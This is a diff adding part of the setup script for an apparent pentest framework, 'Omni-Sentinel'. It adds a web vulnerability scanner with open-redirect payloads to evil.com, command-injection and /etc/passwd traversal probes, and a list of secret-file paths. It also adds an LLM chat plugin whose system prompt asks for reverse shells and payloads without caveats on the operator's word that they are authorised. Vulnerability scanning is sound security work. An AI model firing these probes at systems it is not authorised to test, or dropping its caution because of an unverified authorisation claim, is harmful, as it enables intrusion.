+    background: color === "green" ? "#22c55e" : color === "red" ? "#ef4444" : "#f59e0b",
+    color: "#000", fontWeight: 700, marginRight: 6,
+  }),
+};
+
+export function SideBySideDiff({ diff, baseline, current }) {
+  const [filter, setFilter] = useState("all");
+
+  if (!diff) return <p style={{ color: "#64748b" }}>Run a diff to see results here.</p>;
+  if (diff.error) return <p style={{ color: "#ef4444" }}>{diff.error}</p>;
+
+  const { new_ports = {}, closed_ports = {}, changed_services = {}, summary = {} } = diff;
+
+  const allPorts = new Set([
+    ...Object.keys(new_ports),
+    ...Object.keys(closed_ports),
+    ...Object.keys(changed_services),
+    ...(current ? Object.keys(current) : []),
+    ...(baseline ? Object.keys(baseline) : []),
+  ]);
+
+  return (
+    <div>
+      <div style={{ display: "flex", gap: 16, marginBottom: 16, flexWrap: "wrap" }}>
+        {[["all", "All"], ["new", "New"], ["closed", "Closed"], ["changed", "Changed"]].map(([val, label]) => (
+          <button key={val} onClick={() => setFilter(val)}
+            style={{ padding: "4px 14px", borderRadius: 4, border: "none", cursor: "pointer", fontSize: 12,
+              background: filter === val ? "#3b82f6" : "#1e293b", color: filter === val ? "#fff" : "#94a3b8" }}>
+            {label}
+            {val === "new" && <span style={{ marginLeft: 4, ...S.badge("green") }}>{summary.new}</span>}
+            {val === "closed" && <span style={{ marginLeft: 4, ...S.badge("red") }}>{summary.closed}</span>}
+            {val === "changed" && <span style={{ marginLeft: 4, ...S.badge("yellow") }}>{summary.changed}</span>}
+          </button>
+        ))}
+      </div>
+
+      <div style={S.grid}>
+        <div style={S.col}>
+          <div style={S.header}>Baseline Scan</div>
+          {[...allPorts].sort().map(port => {
+            if (filter !== "all") {
+              if (filter === "new" && !new_ports[port]) return null;
+              if (filter === "closed" && !closed_ports[port]) return null;
+              if (filter === "changed" && !changed_services[port]) return null;
+            }
+            const info = baseline?.[port] || closed_ports[port];
+            const color = closed_ports[port] ? "red" : changed_services[port] ? "yellow" : "none";
+            if (!info && !closed_ports[port]) return null;
+            return (
+              <div key={port} style={S.row(color)}>
+                <code style={{ color: "#38bdf8" }}>:{port}</code>
+                {info ? ` ${info.service || "?"} ${info.version || ""}` : " —"}
+                {closed_ports[port] && <span style={S.badge("red")}>CLOSED</span>}
+              </div>
+            );
+          })}
+          {Object.keys(baseline || {}).length === 0 && <p style={{ color: "#475569", fontSize: 12 }}>No baseline data</p>}
+        </div>
+
+        <div style={S.col}>
+          <div style={S.header}>Current Scan</div>
+          {[...allPorts].sort().map(port => {
+            if (filter !== "all") {
+              if (filter === "new" && !new_ports[port]) return null;
+              if (filter === "closed" && !closed_ports[port]) return null;
+              if (filter === "changed" && !changed_services[port]) return null;
+            }
+            const info = current?.[port] || new_ports[port];
+            const color = new_ports[port] ? "green" : changed_services[port] ? "yellow" : "none";
+            if (!info && !new_ports[port]) return null;
+            return (
+              <div key={port} style={S.row(color)}>
+                <code style={{ color: "#38bdf8" }}>:{port}</code>
+                {info ? ` ${info.service || "?"} ${info.version || ""}` : " —"}
+                {new_ports[port] && <span style={S.badge("green")}>NEW</span>}
+                {changed_services[port] && (
+                  <span style={{ fontSize: 11, color: "#f59e0b" }}>
+                    {Object.entries(changed_services[port]).map(([f, { before, after }]) =>
+                      ` ${f}: ${before}→${after}`).join(", ")}
+                  </span>
+                )}
+              </div>
+            );
+          })}
+          {Object.keys(current || {}).length === 0 && <p style={{ color: "#475569", fontSize: 12 }}>No current data</p>}
+        </div>
+      </div>
+
+      <p style={{ fontSize: 11, color: "#475569", marginTop: 10 }}>
+        Baseline: <code>{diff.baseline_id?.slice(0,8)}</code> → Current: <code>{diff.scan_id?.slice(0,8)}</code>
+        {" | "}{summary.unchanged} port(s) unchanged
+      </p>
+    </div>
+  );
+}
+JSX
+
+# ── WebSocket-style scan streaming endpoint ───────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYSTREAM'
+
+# ── SSE Streaming endpoint (live terminal feed) ───────────────────────────────
+from fastapi.responses import StreamingResponse
+import asyncio
+import time as _time
+
+
+@app.get("/scans/{scan_id}/stream")
+async def stream_scan_events(scan_id: str, since: int = 0):
+    """Server-Sent Events stream for live scan terminal output."""
+    async def event_generator():
+        last_id = since
+        max_idle = 120  # seconds
+        idle = 0
+        while idle < max_idle:
+            with closing(get_db()) as db:
+                rows = db.execute(
+                    "SELECT id, event, detail, actor, created_at FROM timeline WHERE scan_id=? AND id>? ORDER BY id ASC",
+                    (scan_id, last_id),
+                ).fetchall()
+                scan_row = db.execute("SELECT status FROM scans WHERE id=?", (scan_id,)).fetchone()
+
+            if rows:
+                idle = 0
+                for row in rows:
+                    last_id = row["id"]
+                    data = json.dumps({"id": row["id"], "event": row["event"],
+                                       "detail": row["detail"], "actor": row["actor"],
+                                       "created_at": row["created_at"]})
+                    yield f"data: {data}\n\n"
+            else:
+                idle += 2
+                yield f"data: {json.dumps({'heartbeat': True, 'status': scan_row['status'] if scan_row else 'unknown'})}\n\n"
+
+            if scan_row and scan_row["status"] in ("COMPLETE", "FAILED"):
+                yield f"data: {json.dumps({'done': True, 'status': scan_row['status']})}\n\n"
+                break
+
+            await asyncio.sleep(2)
+
+    return StreamingResponse(event_generator(), media_type="text/event-stream",
+                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})
+PYSTREAM
+
+cat > "$BASE/plugins/web_vuln.py" <<'PY'
+"""
+web_vuln.py — Unified web vulnerability scanner
+Combines XSS + SQLi with: security headers, sensitive file exposure,
+open redirect, CORS misconfiguration, CSRF absence, command injection,
+directory traversal, and basic IDOR probing.
+"""
+import logging
+import re
+import time
+from typing import Optional
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+SESSION = requests.Session()
+SESSION.headers.update({
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
+})
+
+# ── Security Headers ──────────────────────────────────────────────────────────
+
+SECURITY_HEADERS = {
+    "Strict-Transport-Security": "HSTS missing — downgrade attacks possible",
+    "X-Frame-Options": "Clickjacking risk — no frame protection",
+    "X-Content-Type-Options": "MIME-sniffing risk — nosniff not set",
+    "Content-Security-Policy": "CSP absent — XSS mitigation reduced",
+    "Referrer-Policy": "Referrer leakage possible",
+    "Permissions-Policy": "Feature policy not set",
+    "X-XSS-Protection": "Legacy XSS protection header absent",
+}
+
+
+def check_security_headers(url: str, timeout: int = 8) -> dict:
+    try:
+        resp = SESSION.get(url, timeout=timeout, verify=False, allow_redirects=True)
+    except requests.RequestException as exc:
+        return {"error": str(exc), "missing": [], "present": []}
+
+    missing = []
+    present = []
+    for header, reason in SECURITY_HEADERS.items():
+        if header.lower() not in {k.lower() for k in resp.headers}:
+            missing.append({"header": header, "reason": reason})
+        else:
+            present.append(header)
+
+    server = resp.headers.get("Server", "")
+    powered_by = resp.headers.get("X-Powered-By", "")
+    info_leak = []
+    if server:
+        info_leak.append({"header": "Server", "value": server})
+    if powered_by:
+        info_leak.append({"header": "X-Powered-By", "value": powered_by})
+
+    return {
+        "url": url,
+        "status_code": resp.status_code,
+        "missing_headers": missing,
+        "present_headers": present,
+        "info_leakage": info_leak,
+        "score": len(present),
+        "max_score": len(SECURITY_HEADERS),
+        "grade": "A" if len(missing) == 0 else "B" if len(missing) <= 2 else "C" if len(missing) <= 4 else "F",
+    }
+
+
+# ── Sensitive File Exposure ────────────────────────────────────────────────────
+
+SENSITIVE_PATHS = [
+    "/.env", "/.env.local", "/.env.backup", "/.env.prod",
+    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
+    "/robots.txt", "/sitemap.xml",
+    "/phpinfo.php", "/info.php", "/test.php",
+    "/admin", "/admin/", "/admin.php", "/administrator",
+    "/wp-admin/", "/wp-login.php", "/wp-config.php",
+    "/config.php", "/config.yml", "/config.yaml", "/config.json",
+    "/backup.sql", "/dump.sql", "/database.sql",
+    "/server-status", "/server-info",
+    "/.htaccess", "/.htpasswd",
+    "/web.config",
+    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
+    "/api/swagger.json", "/swagger.json", "/openapi.json",
+    "/v1/swagger.json", "/api/v1/swagger.json",
+    "/graphql", "/graphiql", "/__graphql",
+    "/debug", "/debug/pprof",
+    "/metrics", "/health", "/status",
+    "/.DS_Store",
+    "/crossdomain.xml", "/clientaccesspolicy.xml",
+]
+
+SENSITIVE_CONTENT = [
+    ("password", 9.0, "Credential exposure"),
+    ("secret", 8.5, "Secret key exposure"),
+    ("api_key", 8.5, "API key exposure"),
+    ("aws_access", 9.5, "AWS credential exposure"),
+    ("private_key", 9.5, "Private key exposure"),
+    ("BEGIN RSA", 9.5, "RSA private key exposed"),
+    ("DB_PASS", 8.0, "Database password exposure"),
+    ("[database]", 6.0, "Database config exposure"),
+]
+
+
+def check_sensitive_files(base_url: str, timeout: int = 6) -> list:
+    findings = []
+    parsed = urlparse(base_url)
+    root = f"{parsed.scheme}://{parsed.netloc}"
+
+    for path in SENSITIVE_PATHS:
+        url = root + path
+        try:
+            resp = SESSION.get(url, timeout=timeout, verify=False, allow_redirects=False)
+            if resp.status_code in (200, 301, 302, 403):
+                severity = "HIGH"
+                detail = f"HTTP {resp.status_code}"
+                cvss = 7.5
+
+                if resp.status_code == 200:
+                    for keyword, score, reason in SENSITIVE_CONTENT:
+                        if keyword.lower() in resp.text.lower():
+                            severity = "CRITICAL"
+                            detail = f"HTTP 200 + sensitive content: {reason}"
+                            cvss = score
+                            break
+
+                findings.append({
+                    "path": path,
+                    "url": url,
+                    "status_code": resp.status_code,
+                    "severity": severity,
+                    "cvss": cvss,
+                    "detail": detail,
+                    "content_snippet": resp.text[:200] if resp.status_code == 200 else "",
+                })
+        except requests.RequestException:
+            continue
+
+    return findings
+
+
+# ── Open Redirect ─────────────────────────────────────────────────────────────
+
+REDIRECT_PAYLOADS = [
+    "https://evil.com",
+    "//evil.com",
+    "///evil.com",
+    "/\\evil.com",
+    "https:evil.com",
+    "javascript:alert(1)",
+    "%2F%2Fevil.com",
+    "http://evil.com@trusted.com",
+]
+
+REDIRECT_PARAMS = ["redirect", "return", "next", "url", "goto", "dest", "destination",
+                   "redir", "redirect_uri", "redirect_url", "return_url", "forward",
+                   "continue", "target", "link", "location", "ref"]
+
+
+def check_open_redirect(url: str, timeout: int = 6) -> list:
+    findings = []
+    parsed = urlparse(url)
+    existing_params = list(parse_qs(parsed.query).keys())
+    test_params = existing_params + [p for p in REDIRECT_PARAMS if p not in existing_params]
+
+    for param in test_params[:8]:
+        for payload in REDIRECT_PAYLOADS[:4]:
+            params = dict(parse_qs(parsed.query))
+            params[param] = [payload]
+            flat = {k: v[0] for k, v in params.items()}
+            inject_url = parsed._replace(query=urlencode(flat)).geturl()
+            try:
+                resp = SESSION.get(inject_url, timeout=timeout, verify=False, allow_redirects=False)
+                if resp.status_code in (301, 302, 303, 307, 308):
+                    location = resp.headers.get("Location", "")
+                    if "evil.com" in location or location.startswith("//") or location.startswith("\\\\"):
+                        findings.append({
+                            "param": param,
+                            "payload": payload,
+                            "url": inject_url,
+                            "location": location,
+                            "status_code": resp.status_code,
+                            "confirmed": True,
+                        })
+                        break
+            except requests.RequestException:
+                continue
+
+    return findings
+
+
+# ── CORS Misconfiguration ─────────────────────────────────────────────────────
+
+def check_cors(url: str, timeout: int = 6) -> dict:
+    origins_to_test = [
+        "https://evil.com",
+        "https://attacker.com",
+        "null",
+        "http://localhost",
+    ]
+    issues = []
+    for origin in origins_to_test:
+        try:
+            resp = SESSION.get(url, timeout=timeout, verify=False,
+                               headers={"Origin": origin})
+            acao = resp.headers.get("Access-Control-Allow-Origin", "")
+            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+            if acao == "*" and acac.lower() == "true":
+                issues.append({"origin": origin, "acao": acao, "acac": acac,
+                                "severity": "CRITICAL", "reason": "Wildcard CORS with credentials"})
+            elif acao == origin or acao == "null":
+                severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
+                issues.append({"origin": origin, "acao": acao, "acac": acac,
+                                "severity": severity, "reason": "Origin reflected in ACAO header"})
+        except requests.RequestException:
+            continue
+    return {"url": url, "issues": issues, "vulnerable": len(issues) > 0}
+
+
+# ── Command Injection (Time-based) ────────────────────────────────────────────
+
+CMD_PAYLOADS = [
+    ("; sleep 3 #", 3.0),
+    ("| sleep 3", 3.0),
+    ("` sleep 3 `", 3.0),
+    ("%0a sleep 3", 3.0),
+    ("$(sleep 3)", 3.0),
+    ("; ping -c 3 127.0.0.1 #", 3.0),
+]
+
+
+def check_command_injection(url: str, timeout: int = 12) -> list:
+    findings = []
+    parsed = urlparse(url)
+    params = list(parse_qs(parsed.query).keys()) or ["q", "cmd", "exec", "input", "id", "name"]
+
+    for param in params[:5]:
+        for payload, expected_delay in CMD_PAYLOADS:
+            existing = dict(parse_qs(parsed.query))
+            base_val = existing.get(param, ["test"])[0]
+            existing[param] = [base_val + payload]
+            flat = {k: v[0] for k, v in existing.items()}
+            inject_url = parsed._replace(query=urlencode(flat)).geturl()
+            try:
+                start = time.monotonic()
+                SESSION.get(inject_url, timeout=timeout, verify=False)
+                elapsed = time.monotonic() - start
+                if elapsed >= expected_delay:
+                    findings.append({
+                        "param": param,
+                        "payload": payload,
+                        "url": inject_url,
+                        "elapsed": round(elapsed, 2),
+                        "confirmed": True,
+                        "type": "time_based",
+                    })
+                    break
+            except requests.RequestException:
+                continue
+
+    return findings
+
+
+# ── Directory Traversal ───────────────────────────────────────────────────────
+
+TRAVERSAL_PAYLOADS = [
+    "../../../../etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "....//....//....//etc/passwd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "....\\\\....\\\\windows\\win.ini",
+]
+
+TRAVERSAL_SIGS = ["root:x:0:0", "[fonts]", "[extensions]", "daemon:x:", "bin/bash", "bin/sh"]
+
+
+def check_directory_traversal(url: str, timeout: int = 8) -> list:
+    findings = []
+    parsed = urlparse(url)
+    params = list(parse_qs(parsed.query).keys()) or ["file", "path", "page", "include", "doc", "template"]
+
+    for param in params[:5]:
+        for payload in TRAVERSAL_PAYLOADS:
+            existing = dict(parse_qs(parsed.query))
+            existing[param] = [payload]
+            flat = {k: v[0] for k, v in existing.items()}
+            inject_url = parsed._replace(query=urlencode(flat)).geturl()
+            try:
+                resp = SESSION.get(inject_url, timeout=timeout, verify=False)
+                for sig in TRAVERSAL_SIGS:
+                    if sig in resp.text:
+                        findings.append({
+                            "param": param,
+                            "payload": payload,
+                            "url": inject_url,
+                            "signature": sig,
+                            "confirmed": True,
+                        })
+                        break
+            except requests.RequestException:
+                continue
+
+    return findings
+
+
+# ── Basic IDOR Probe ──────────────────────────────────────────────────────────
+
+def check_idor(url: str, timeout: int = 6) -> list:
+    findings = []
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+
+    for param, values in params.items():
+        original = values[0]
+        if not original.isdigit():
+            continue
+        for alt in [str(int(original) - 1), str(int(original) + 1), "0", "1"]:
+            if alt == original:
+                continue
+            modified = dict(params)
+            modified[param] = [alt]
+            flat = {k: v[0] for k, v in modified.items()}
+            inject_url = parsed._replace(query=urlencode(flat)).geturl()
+            try:
+                orig_resp = SESSION.get(url, timeout=timeout, verify=False)
+                alt_resp = SESSION.get(inject_url, timeout=timeout, verify=False)
+                if (alt_resp.status_code == 200 and orig_resp.status_code == 200
+                        and len(alt_resp.text) > 100
+                        and abs(len(alt_resp.text) - len(orig_resp.text)) < 5000):
+                    findings.append({
+                        "param": param,
+                        "original_value": original,
+                        "tested_value": alt,
+                        "url": inject_url,
+                        "status_code": alt_resp.status_code,
+                        "potential": True,
+                        "note": "Response returned data for different ID — manual verification required",
+                    })
+            except requests.RequestException:
+                continue
+
+    return findings
+
+
+# ── Full Web Vuln Scan ────────────────────────────────────────────────────────
+
+def scan_web_vulns(url: str, run_sqli: bool = True, run_xss: bool = True) -> dict:
+    """Run all web vulnerability checks against a URL."""
+    results: dict = {"url": url, "checks": {}}
+
+    # Security headers
+    results["checks"]["headers"] = check_security_headers(url)
+
+    # Sensitive files
+    results["checks"]["sensitive_files"] = check_sensitive_files(url)
+
+    # Open redirect
+    results["checks"]["open_redirect"] = {
+        "url": url, "findings": check_open_redirect(url),
+        "vulnerable": bool(check_open_redirect(url)),
+    }
+
+    # CORS
+    results["checks"]["cors"] = check_cors(url)
+
+    # Command injection
+    cmdi = check_command_injection(url)
+    results["checks"]["command_injection"] = {"url": url, "findings": cmdi, "vulnerable": bool(cmdi)}
+
+    # Directory traversal
+    dt = check_directory_traversal(url)
+    results["checks"]["directory_traversal"] = {"url": url, "findings": dt, "vulnerable": bool(dt)}
+
+    # IDOR
+    idor = check_idor(url)
+    results["checks"]["idor"] = {"url": url, "findings": idor, "potential": bool(idor)}
+
+    # XSS (reuse existing scanner)
+    if run_xss:
+        try:
+            from plugins.xss_scanner import scan_xss
+            results["checks"]["xss"] = scan_xss(url)
+        except ImportError:
+            results["checks"]["xss"] = {"error": "xss_scanner not available"}
+
+    # SQLi (reuse existing scanner)
+    if run_sqli:
+        try:
+            from plugins.sqli_scanner import scan_sqli
+            results["checks"]["sqli"] = scan_sqli(url)
+        except ImportError:
+            results["checks"]["sqli"] = {"error": "sqli_scanner not available"}
+
+    # Summary
+    critical_count = 0
+    high_count = 0
+    medium_count = 0
+
+    for check_name, data in results["checks"].items():
+        if isinstance(data, dict):
+            findings = data.get("findings", [])
+            if isinstance(findings, list):
+                for f in findings:
+                    sev = f.get("severity", "")
+                    if sev == "CRITICAL":
+                        critical_count += 1
+                    elif sev == "HIGH":
+                        high_count += 1
+                    elif sev == "MEDIUM":
+                        medium_count += 1
+            if data.get("vulnerable") or data.get("potential"):
+                if check_name in ("command_injection", "directory_traversal", "sqli"):
+                    critical_count += 1
+                elif check_name in ("xss", "open_redirect", "cors"):
+                    high_count += 1
+
+    results["summary"] = {
+        "critical": critical_count,
+        "high": high_count,
+        "medium": medium_count,
+        "total_checks": len(results["checks"]),
+    }
+
+    return results
+PY
+
+cat > "$BASE/plugins/ai_chat.py" <<'PY'
+"""
+ai_chat.py — Ollama-powered AI assistant for Omni-Sentinel
+Provides pentest-aware chat using a locally-running Ollama instance.
+Supports scan context injection so the model knows what was found.
+"""
+import json
+import logging
+import os
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+OLLAMA_BASE = os.getenv("OLLAMA_BASE_URL", "http://localhost:11434")
+OLLAMA_MODEL = os.getenv("OLLAMA_MODEL", "llama3")
+OLLAMA_TIMEOUT = int(os.getenv("OLLAMA_TIMEOUT", "120"))
+
+SYSTEM_PROMPT = """You are an expert penetration tester and red team operator embedded inside
+Omni-Sentinel, an autonomous pen-test framework. Your job is to help the operator:
+
+1. Analyse scan results, CVEs, and service banners
+2. Suggest exploitation paths, lateral movement techniques, and privilege escalation
+3. Write custom payloads, reverse shells, and one-liners on request
+4. Explain vulnerability details and reference PoC/exploits (Exploit-DB, GitHub, etc.)
+5. Draft professional penetration test report sections
+6. Recommend remediation and patch guidance for the target organisation
+
+Tone: concise, technical, direct — like a senior red teamer talking to a peer.
+Do NOT add unnecessary caveats. The operator is authorised on the target.
+When writing payloads or commands, use code blocks.
+When recommending exploits, include CVE IDs, CVSS scores, and affected versions.
+"""
+
+
+def _build_context_block(scan_data: Optional[dict]) -> str:
+    """Format scan data as a structured context block for the model."""
+    if not scan_data:
+        return ""
+    lines = ["=== SCAN CONTEXT ==="]
+    target = scan_data.get("target", "unknown")
+    status = scan_data.get("status", "unknown")
+    os_hint = scan_data.get("os_hint", "unknown")
+    lines.append(f"Target: {target}")
+    lines.append(f"Status: {status}")
+    lines.append(f"OS/Platform: {os_hint}")
+
+    data = scan_data.get("data")
+    if data:
+        if isinstance(data, str):
+            try:
+                data = json.loads(data)
+            except (json.JSONDecodeError, TypeError):
+                data = {}
+
+        services = data.get("services", [])
+        if services:
+            lines.append("\nOpen Services:")
+            for svc in services[:20]:
+                port = svc.get("port", "?")
+                proto = svc.get("proto", "tcp")
+                service = svc.get("service", "")
+                product = svc.get("product", "")
+                version = svc.get("version", "")
+                cves = svc.get("cves", [])
+                cve_str = ""
+                if cves:
+                    cve_ids = [c.get("id", "") for c in cves[:3]]
+                    cve_str = f" | CVEs: {', '.join(cve_ids)}"
+                lines.append(f"  :{port}/{proto} {service} {product} {version}{cve_str}")
+
+        all_cves = data.get("all_cves", [])
+        if all_cves:
+            lines.append("\nTop CVEs:")
+            for cve in sorted(all_cves, key=lambda c: float(c.get("score", 0) or 0), reverse=True)[:10]:
+                cid = cve.get("id", "")
+                score = cve.get("score", "N/A")
+                sev = cve.get("severity", "")
+                desc = cve.get("description", "")[:120]
+                lines.append(f"  {cid} CVSS:{score} [{sev}] — {desc}")
+
+    tags = scan_data.get("tags", "[]")
+    if isinstance(tags, str):
+        try:
+            tags = json.loads(tags)
+        except (json.JSONDecodeError, TypeError):
+            tags = []
+    if tags:
+        lines.append(f"\nTags: {', '.join(tags)}")
+
+    lines.append("=== END CONTEXT ===\n")
+    return "\n".join(lines)
+
+
+def check_ollama() -> dict:
+    """Check if Ollama is running and return available models."""
+    try:
+        resp = requests.get(f"{OLLAMA_BASE}/api/tags", timeout=5)
+        if resp.status_code == 200:
+            models = [m["name"] for m in resp.json().get("models", [])]
+            return {"running": True, "models": models, "base_url": OLLAMA_BASE}
+        return {"running": False, "error": f"HTTP {resp.status_code}", "base_url": OLLAMA_BASE}
+    except requests.ConnectionError:
+        return {"running": False, "error": "Cannot connect to Ollama. Is it running?", "base_url": OLLAMA_BASE}
+    except requests.RequestException as exc:
+        return {"running": False, "error": str(exc), "base_url": OLLAMA_BASE}
+
+
+def chat(
+    message: str,
+    history: Optional[list] = None,
+    scan_data: Optional[dict] = None,
+    model: Optional[str] = None,
+    stream: bool = False,
+) -> dict:
+    """
+    Send a chat message to Ollama.
+
+    Args:
+        message: The user's message
+        history: List of {"role": "user"|"assistant", "content": "..."} dicts
+        scan_data: Optional scan dict to inject as context
+        model: Override the default model
+        stream: If True, returns raw response for streaming
+
+    Returns:
+        {"response": str, "model": str, "done": bool, "error": str|None}
+    """
+    model = model or OLLAMA_MODEL
+    history = history or []
+
+    # Build messages array
+    messages = [{"role": "system", "content": SYSTEM_PROMPT}]
+
+    # Inject scan context as a system message if provided
+    context_block = _build_context_block(scan_data)
+    if context_block:
+        messages.append({"role": "system", "content": context_block})
+
+    # Add conversation history
+    for turn in history[-20:]:  # Keep last 20 turns to avoid token overflow
+        if turn.get("role") in ("user", "assistant") and turn.get("content"):
+            messages.append({"role": turn["role"], "content": turn["content"]})
+
+    # Add current message
+    messages.append({"role": "user", "content": message})
+
+    payload = {
+        "model": model,
+        "messages": messages,
+        "stream": False,
+        "options": {
+            "temperature": 0.7,
+            "top_p": 0.9,
+            "num_ctx": 8192,
+        },
+    }
+
+    try:
+        resp = requests.post(
+            f"{OLLAMA_BASE}/api/chat",
+            json=payload,
+            timeout=OLLAMA_TIMEOUT,
+        )
+        if resp.status_code != 200:
+            return {
+                "response": None,
+                "model": model,
+                "done": False,
+                "error": f"Ollama returned HTTP {resp.status_code}: {resp.text[:200]}",
+            }
+        data = resp.json()
+        content = data.get("message", {}).get("content", "")
+        return {
+            "response": content,
+            "model": model,
+            "done": data.get("done", True),
+            "prompt_tokens": data.get("prompt_eval_count"),
+            "response_tokens": data.get("eval_count"),
+            "error": None,
+        }
+    except requests.Timeout:
+        return {
+            "response": None,
+            "model": model,
+            "done": False,
+            "error": f"Ollama timed out after {OLLAMA_TIMEOUT}s. Try a smaller model or increase OLLAMA_TIMEOUT.",
+        }
+    except requests.RequestException as exc:
+        return {"response": None, "model": model, "done": False, "error": str(exc)}
+
+
+def pull_model(model_name: str) -> dict:
+    """Trigger an Ollama model pull."""
+    try:
+        resp = requests.post(
+            f"{OLLAMA_BASE}/api/pull",
+            json={"name": model_name, "stream": False},
+            timeout=300,
+        )
+        if resp.status_code == 200:
+            return {"success": True, "model": model_name}
+        return {"success": False, "error": f"HTTP {resp.status_code}"}
+    except requests.RequestException as exc:
+        return {"success": False, "error": str(exc)}
+PY
+
+# ── New API endpoints: web vuln + AI chat ─────────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYEXTRA'
+
+
+# ── Web Vulnerability Scanner ─────────────────────────────────────────────────
+
+class WebVulnRequest(BaseModel):
+    url: str
+    run_sqli: bool = True
+    run_xss: bool = True
+
+
+@app.post("/scans/{scan_id}/webvuln")
+def run_web_vuln(scan_id: str, request: WebVulnRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        scan = db.execute("SELECT * FROM scans WHERE id=?", (scan_id,)).fetchone()
+    if not scan:
+        raise HTTPException(status_code=404, detail="Scan not found")
+    try:
+        from plugins.web_vuln import scan_web_vulns
+        result = scan_web_vulns(request.url, run_sqli=request.run_sqli, run_xss=request.run_xss)
+        log_event(scan_id, "webvuln_complete",
+                  f"URL: {request.url} | critical={result['summary']['critical']} high={result['summary']['high']}",
+                  actor=user["username"])
+        return result
+    except Exception as exc:
+        log_event(scan_id, "webvuln_error", str(exc), actor=user["username"])
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+@app.post("/webvuln")
+def run_web_vuln_standalone(request: WebVulnRequest, user: dict = Depends(verify_token)) -> dict:
+    """Run web vuln scan without a parent scan ID (quick standalone check)."""
+    try:
+        from plugins.web_vuln import scan_web_vulns
+        return scan_web_vulns(request.url, run_sqli=request.run_sqli, run_xss=request.run_xss)
+    except Exception as exc:
+        raise HTTPException(status_code=500, detail=str(exc))
+
+
+# ── AI Chat (Ollama) ──────────────────────────────────────────────────────────
+
+class ChatMessage(BaseModel):
+    message: str
+    history: list = []
+    scan_id: Optional[str] = None
+    model: Optional[str] = None
+
+
+@app.get("/ai/status")
+def ai_status(user: dict = Depends(verify_token)) -> dict:
+    from plugins.ai_chat import check_ollama
+    return check_ollama()
+
+
+@app.post("/ai/chat")
+def ai_chat(request: ChatMessage, user: dict = Depends(verify_token)) -> dict:
+    from plugins.ai_chat import chat as ollama_chat
+
+    scan_data = None
+    if request.scan_id:
+        with closing(get_db()) as db:
+            row = db.execute("SELECT * FROM scans WHERE id=?", (request.scan_id,)).fetchone()
+            if row:
+                scan_data = dict(row)
+
+    result = ollama_chat(
+        message=request.message,
+        history=request.history,
+        scan_data=scan_data,
+        model=request.model,
+    )
+
+    if result.get("error"):
+        raise HTTPException(status_code=502, detail=result["error"])
+
+    return result
+
+
+@app.get("/ai/models")
+def ai_models(user: dict = Depends(verify_token)) -> dict:
+    from plugins.ai_chat import check_ollama
+    status = check_ollama()
+    return {"models": status.get("models", []), "running": status.get("running", False)}
+
+
+@app.post("/ai/pull")
+def ai_pull_model(body: dict, user: dict = Depends(require_admin)) -> dict:
+    model_name = body.get("model", "")
+    if not model_name:
+        raise HTTPException(status_code=400, detail="model name required")
+    from plugins.ai_chat import pull_model
+    return pull_model(model_name)
+PYEXTRA
+
+cat > "$BASE/plugins/osint.py" <<'PY'
+"""
+osint.py — Advanced OSINT module for Omni-Sentinel V21.3
+
+Free (no key) sources:
+  crt.sh        — Certificate Transparency subdomain mining
+  Shodan InternetDB — Passive port/vuln/tag data (no auth)
+  BGPView       — ASN, prefix, ISP, country
+  GreyNoise     — Community threat intel (noise/RIOT classification)
+  URLScan.io    — Historical scan results for domain/IP
+  IPInfo        — Geolocation, org, hostname (free tier, no key)
+  Wayback CDX   — First seen, last seen, snapshot count
+  HackerTarget  — Reverse IP lookup (shared hosting neighbours)
+
+Optional (set in .env):
+  OSINT_SHODAN_KEY    — Full Shodan API (deeper data, CVE enrichment)
+  OSINT_VT_KEY        — VirusTotal domain/IP reputation
+  OSINT_ABUSEIPDB_KEY — AbuseIPDB confidence score
+  OSINT_HIBP_KEY      — HaveIBeenPwned email breach check
+"""
+
+import ipaddress
+import json
+import logging
+import re
+import shutil
+import socket
+import subprocess
+import time
+from typing import Optional
+from urllib.parse import quote_plus
+
+import requests
+
+logger = logging.getLogger(__name__)
+requests.packages.urllib3.disable_warnings()
+
+_SESSION = requests.Session()
+_SESSION.headers.update({
+    "User-Agent": "Omni-Sentinel/21.3 OSINT (+https://github.com/Lolkesh/lolkesh-tool)"
+})
+
+import os
+from dotenv import load_dotenv
+load_dotenv()
+
+SHODAN_KEY    = os.getenv("OSINT_SHODAN_KEY", "")
+VT_KEY        = os.getenv("OSINT_VT_KEY", "")
+ABUSEIPDB_KEY = os.getenv("OSINT_ABUSEIPDB_KEY", "")
+HIBP_KEY      = os.getenv("OSINT_HIBP_KEY", "")
+
+
+# ── Helpers ───────────────────────────────────────────────────────────────────
+
+def _get(url: str, params: dict = None, headers: dict = None,
+         timeout: int = 10, retries: int = 2) -> Optional[requests.Response]:
+    for attempt in range(retries):
+        try:
+            r = _SESSION.get(url, params=params, headers=headers,
+                             timeout=timeout, verify=False)
+            if r.status_code == 429:
+                time.sleep(2 ** attempt)
+                continue
+            return r
+        except requests.RequestException as exc:
+            logger.debug(f"OSINT GET failed ({url}): {exc}")
+            if attempt == retries - 1:
+                return None
+    return None
+
+
+def _is_ip(value: str) -> bool:
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except ValueError:
+        return False
+
+
+def _resolve(domain: str) -> list:
+    try:
+        results = socket.getaddrinfo(domain, None)
+        return list({r[4][0] for r in results})
+    except socket.gaierror:
+        return []
+
+
+# ── Certificate Transparency (crt.sh) ────────────────────────────────────────
+
+def crtsh_subdomains(domain: str) -> dict:
+    """Mine subdomains from certificate transparency logs via crt.sh."""
+    url = "https://crt.sh/"
